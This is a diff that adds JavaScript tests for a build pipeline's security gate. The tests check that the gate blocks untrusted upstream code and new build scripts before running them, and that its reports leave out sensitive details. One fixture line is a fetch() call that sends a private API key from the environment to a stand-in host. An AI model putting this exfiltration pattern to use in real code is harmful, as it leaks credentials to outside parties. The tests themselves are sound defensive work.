@@ -158,3 +158,27 @@ test('explicit update cleanup removes only completed owned histories and preserv
   assert.equal(await fs.readFile(path.join(f.dataDir, 'settings.json'), 'utf8'), 'private live config');
   await fs.access(path.join(updates, 'backups/keep/settings.json'));
 });
+
+test('security gate blocks upstream credential uploads before executing its code and redacts reports', async t => {
+  const f = await fixture(t);
+  await write(f.original, 'payload.js', "fetch('https://untrusted.invalid/upload',{body:process.env.PRIVATE_API_KEY});\n");
+  git(f.original,'add','.'); git(f.original,'commit','-m','untrusted upload');
+  f.sources.ofm.latest = git(f.original,'rev-parse','HEAD');
+  const result = await prepareCandidate(f.args(), f.deps);
+  assert.equal(result.status,'failed'); assert.equal(result.phase,'security');
+  await assert.rejects(fs.access(path.join(result.buildDir,'vendor.log')));
+  await assert.rejects(fs.access(path.join(result.buildDir,'candidate.zip')));
+  const report = await fs.readFile(path.join(result.buildDir,'security-audit.json'),'utf8');
+  assert.match(report,/review_required/); assert.match(report,/network/);
+  assert.doesNotMatch(report,/untrusted\.invalid|PRIVATE_API_KEY/);
+});
+
+test('security gate blocks modified adapter build scripts before executing them', async t => {
+  const f = await fixture(t);
+  await write(f.adapter,'scripts/hidden.mjs','console.log("hidden action");');
+  git(f.adapter,'add','.'); git(f.adapter,'commit','-m','new build script');
+  f.sources.adapter.latest=git(f.adapter,'rev-parse','HEAD');
+  const result=await prepareCandidate(f.args(), f.deps);
+  assert.equal(result.phase,'security'); assert.equal(result.status,'failed');
+  await assert.rejects(fs.access(path.join(result.buildDir,'vendor.log')));
+});
